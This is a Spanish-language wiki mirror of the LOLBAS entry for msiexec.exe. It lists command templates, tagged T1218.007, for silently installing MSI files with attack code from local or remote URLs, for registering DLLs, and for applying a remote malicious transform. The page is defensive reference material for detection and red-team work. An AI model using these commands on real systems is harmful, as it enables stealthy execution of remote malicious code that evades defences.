# LOLBAS: Msiexec.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Used by Windows to execute msi files

## Comandos

### Execute custom made msi file with attack code

Execute · priv: User · T1218.007

```cmd
msiexec /quiet /i {PATH:.msi}
```

Installs the target .MSI file silently.

### Execute custom made msi file with attack code from remote server

Execute · priv: User · T1218.007

```cmd
msiexec /q /i {REMOTEURL}
```

Installs the target remote & renamed .MSI file silently.

### Execute dll files

Execute · priv: User · T1218.007

```cmd
msiexec /y {PATH_ABSOLUTE:.dll}
```

Calls DllRegisterServer to register the target DLL.

### Execute dll files

Execute · priv: User · T1218.007

```cmd
msiexec /z {PATH_ABSOLUTE:.dll}
```

Calls DllUnregisterServer to un-register the target DLL.

### Install trusted and signed msi file, with additional attack code as transformation file, from a remote server

Execute · priv: User · T1218.007

```cmd
msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
```

Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.

